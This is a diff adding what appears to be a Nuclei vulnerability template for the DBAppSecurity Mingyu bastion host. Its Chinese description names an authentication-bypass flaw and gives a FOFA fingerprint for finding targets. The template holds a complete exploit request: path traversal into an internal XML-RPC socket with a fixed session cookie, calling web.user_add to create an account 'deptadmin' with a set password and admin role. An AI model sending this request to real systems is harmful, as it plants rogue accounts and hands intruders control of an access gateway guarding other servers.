@@ -1,0 +1,112 @@
+id: dbappsecurity-bastion-user-register
+
+info:
+  name: 安恒明御运维审计与风险控制系统堡垒机用户注册接口权限控制缺陷
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: 明御运维审计与风险控制系统
+          安恒明御运维审计与风险控制系统 xmlrpc.sock 接口存在权限校验逻辑缺陷，攻击者可利用该缺陷绕过身份验证机制，在目标系统中创建任意用户账户，从而实现对堡垒机的未授权控制
+  tags: 安恒明御运维审计与风险控制系统
+
+http:
+- raw:
+  - |
+    POST /service/?unix:/../../../../var/run/rpc/xmlrpc.sock|http://test/wsrpc HTTP/1.1
+    Host: {{Hostname}}
+    Cache-Control: max-age=0
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+    Accept-Encoding: gzip, deflate
+    Accept-Language: zh-CN,zh;q=0.9
+    Cookie: LANG=zh; USM=0a0e1f29d69f4b9185430328b44ad990832935dbf1b90b8769d297dd9f0eb848
+
+    <?xml version="1.0"?>
+    <methodCall>
+    <methodName>web.user_add</methodName>
+    <params>
+    <param>
+    <value>
+    <array>
+    <data>
+    <value>
+    <string>admin</string>
+    </value>
+    <value>
+    <string>5</string>
+    </value>
+    <value>
+    <string>XX.XX.XX.XX</string>
+    </value>
+    </data>
+    </array>
+    </value>
+    </param>
+    <param>
+    <value>
+    <struct>
+    <member>
+    <name>uname</name>
+    <value>
+    <string>deptadmin</string>
+    </value>
+    </member>
+    <member>
+    <name>name</name>
+    <value>
+    <string>deptadmin</string>
+    </value>
+    </member>
+    <member>
+    <name>pwd</name>
+    <value>
+    <string>Deptadmin@123</string>
+    </value>
+    </member>
+    <member>
+    <name>authmode</name>
+    <value>
+    <string>1</string>
+    </value>
+    </member>
+    <member>
+    <name>deptid</name>
+    <value>
+    <string></string>
+    </value>
+    </member>
+    <member>
+    <name>email</name>
+    <value>
+    <string></string>
+    </value>
+    </member>
+    <member>
+    <name>mobile</name>
+    <value>
+    <string></string>
+    </value>
+    </member>
+    <member>
+    <name>comment</name>
+    <value>
+    <string></string>
+    </value>
+    </member>
+    <member>
+    <name>roleid</name>
+    <value>
+    <string>101</string>
+    </value>
+    </member>
+    </struct></value>
+    </param>
+    </params>
+    </methodCall>
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'uname'
